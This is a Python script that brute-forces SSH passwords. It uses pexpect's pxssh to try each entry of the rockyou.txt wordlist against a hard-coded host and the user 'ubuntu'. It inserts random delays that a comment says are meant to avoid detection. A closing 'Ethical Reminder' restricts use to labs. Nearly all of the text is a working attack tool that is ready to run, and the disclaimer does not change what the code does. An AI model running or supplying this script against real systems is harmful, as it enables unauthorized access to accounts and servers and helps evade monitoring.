

import time
import random
from pexpect import pxssh

# Target credentials
HOST = "192.168.8.206"
USER = "ubuntu"
WORDLIST_PATH = "rockyou.txt"

def try_login(host, user, password):
    try:
        session = pxssh.pxssh()
        session.login(host, user, password)
        print(f"[✓] SUCCESS: Password found -> {password}")
        return True
    except pxssh.ExceptionPxssh:
        print(f"[-] FAILED: {password}")
        return False

def brute_force():
    with open(WORDLIST_PATH, "r", encoding="latin-1") as wordlist:
        for word in wordlist:
            password = word.strip()
            
            if try_login(HOST, USER, password):
                break
            
            # Optional: wait a random short interval to avoid detection
            time.sleep(random.uniform(0.5, 1.5))

if __name__ == "__main__":
    print("[*] Starting SSH brute-force (for educational purposes only)...")
    brute_force()

🛡️ Ethical Reminder

This script is meant solely for legal educational testing, such as penetration testing in labs (e.g., TryHackMe, HackTheBox, your own VMs). Do not use this on unauthorized systems.
